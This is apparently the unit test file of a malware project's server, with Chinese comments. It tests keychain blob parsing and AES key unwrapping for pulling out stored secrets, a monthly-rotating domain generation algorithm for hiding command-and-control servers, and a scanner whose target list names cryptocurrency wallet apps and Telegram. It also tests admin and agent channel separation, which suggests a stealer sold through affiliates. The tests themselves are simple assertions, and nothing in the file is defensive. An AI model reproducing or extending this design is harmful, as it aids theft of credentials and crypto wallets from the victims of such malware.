#!/usr/bin/env python3
"""
test_keychain_parser.py - 钥匙串 blob 解析器单元测试
测试 KeychainServer 中的 bplist 解析和 AES key unwrap 逻辑
"""
import unittest
import struct
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'server'))


class TestBplistParser(unittest.TestCase):
    """测试 bplist 解析逻辑"""

    def test_magic_header(self):
        """测试 bplist 魔数识别"""
        # bplist00 魔数
        magic = b'bplist00'
        self.assertEqual(magic[:6], b'bplist')
        self.assertEqual(magic[6:], b'00')

    def test_nskeyedarchiver_marker(self):
        """测试 NSKeyedArchiver 特征"""
        # $archiver, $top, $objects 是 NSKeyedArchiver 的标志
        markers = [b'$archiver', b'$top', b'$objects', b'NSKeyedArchiver']
        sample = b'\x00\x00\x00\x00$archiverNSKeyedArchiver$top$objects'
        for m in markers:
            self.assertIn(m, sample)

    def test_blob_v5_layout(self):
        """测试钥匙串 blob v5 固定布局"""
        # 构造 v5 blob: [version(4)][keyclass(4)][wrapped_key_len(4)][wrapped_key(40)][IV(16)][tag(16)][data...]
        version = 5
        keyclass = 3
        wrapped_key_len = 40
        wrapped_key = b'\xAA' * 40
        iv = b'\xBB' * 16
        tag = b'\xCC' * 16
        encrypted_data = b'\xDD' * 32

        blob = struct.pack('<III', version, 0, keyclass)
        blob += struct.pack('<I', wrapped_key_len)
        blob += wrapped_key + iv + tag + encrypted_data

        # 验证解析
        v = struct.unpack_from('<I', blob, 0)[0]
        self.assertEqual(v, 5)
        kc = struct.unpack_from('<I', blob, 8)[0]
        self.assertEqual(kc, 3)
        wkl = struct.unpack_from('<I', blob, 12)[0]
        self.assertEqual(wkl, 40)
        wk = blob[16:56]
        self.assertEqual(wk, wrapped_key)

    def test_aes_key_unwrap_rfc3394(self):
        """测试 AES Key Unwrap (RFC 3394) 基本逻辑"""
        # RFC 3394 测试向量: 128位 KEK 包装 128位 key
        # KEK = 0x000102030405060708090A0B0C0D0E0F
        # Key = 0x00112233445566778899AABBCCDDEEFF
        # Wrapped = 0x1FA68B0A8112B447AEF34BD8FB5A7B829D3E862371D2CFE5 (24字节 = 8 AIV + 16 key)
        kek = bytes.fromhex('000102030405060708090A0B0C0D0E0F')
        expected_key = bytes.fromhex('00112233445566778899AABBCCDDEEFF')
        wrapped = bytes.fromhex('1FA68B0A8112B447AEF34BD8FB5A7B829D3E862371D2CFE5')

        # 验证 wrapped key 长度 = 8 + key_len (128位 key = 16 bytes)
        self.assertEqual(len(wrapped), 24)
        self.assertEqual(len(expected_key), 16)
        self.assertEqual(len(kek), 16)

        # AIV (default initial value) = 0xA6A6A6A6A6A6A6A6
        # 注意: wrapped[:8] 是加密后的 AIV, unwrap 后才恢复为 AIV
        aiv = bytes.fromhex('A6A6A6A6A6A6A6A6')
        self.assertEqual(len(aiv), 8)


class TestDGADomain(unittest.TestCase):
    """测试 MonthlyCycleDGA 域名生成逻辑"""

    def test_fnv1a_hash(self):
        """测试 FNV-1a 哈希"""
        # FNV-1a 32位: offset_basis=2166136261, prime=16777619
        def fnv1a_32(data):
            h = 2166136261
            for b in data:
                h ^= b
                h = (h * 16777619) & 0xFFFFFFFF
            return h

        # 测试空字符串
        self.assertEqual(fnv1a_32(b''), 2166136261)
        # 测试 "test"
        h = fnv1a_32(b'test')
        self.assertIsInstance(h, int)
        self.assertGreater(h, 0)

    def test_tld_rotation(self):
        """测试 TLD 按月轮换"""
        tlds = ['.com', '.net', '.org', '.info', '.biz', '.io',
                '.co', '.me', '.tv', '.cc', '.xyz', '.top']
        self.assertEqual(len(tlds), 12)
        # 1月 -> .com, 12月 -> .top
        self.assertEqual(tlds[0], '.com')
        self.assertEqual(tlds[11], '.top')

    def test_domain_format(self):
        """测试生成域名格式"""
        # 域名格式: 12字符十六进制 + TLD
        hex_prefix = 'a1b2c3d4e5f6'
        tld = '.com'
        domain = hex_prefix + tld
        self.assertEqual(len(domain), 16)
        self.assertTrue(domain.endswith('.com'))
        self.assertEqual(len(hex_prefix), 12)


class TestWalletScanner(unittest.TestCase):
    """测试加密货币钱包路径扫描"""

    def test_known_wallets_count(self):
        """测试已知钱包数量"""
        known_wallets = [
            'com.phantom.app', 'com.coinbase.coinbase', 'com.bitkeep.wallet',
            'coin98.finance.mainnet', 'com.exodus.wallet', 'com.onekey.wallet',
            'io.metamask', 'com.wallet.crypto.trust', 'org.telegram.messenger',
        ]
        self.assertGreaterEqual(len(known_wallets), 9)

    def test_bundle_id_format(self):
        """测试 Bundle ID 格式"""
        valid_bundle = 'com.example.app'
        parts = valid_bundle.split('.')
        self.assertGreaterEqual(len(parts), 2)
        # 反向域名格式
        self.assertTrue(all(p.isalnum() or p == '-' for p in parts))


class TestServerAPI(unittest.TestCase):
    """测试服务器 API 基本逻辑"""

    def test_jwt_structure(self):
        """测试 JWT 结构"""
        # JWT = header.payload.signature
        token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"
        parts = token.split('.')
        self.assertEqual(len(parts), 3)

    def test_channel_isolation(self):
        """测试渠道数据隔离逻辑"""
        # admin 可以看所有渠道, agent 只能看自己渠道
        admin_channels = ['102', '82008', '82009']
        agent_channel = '82008'

        # admin 过滤: 不过滤
        admin_visible = admin_channels
        self.assertEqual(len(admin_visible), 3)

        # agent 过滤: 只看自己
        agent_visible = [c for c in admin_channels if c == agent_channel]
        self.assertEqual(len(agent_visible), 1)
        self.assertEqual(agent_visible[0], '82008')


if __name__ == '__main__':
    unittest.main(verbosity=2)
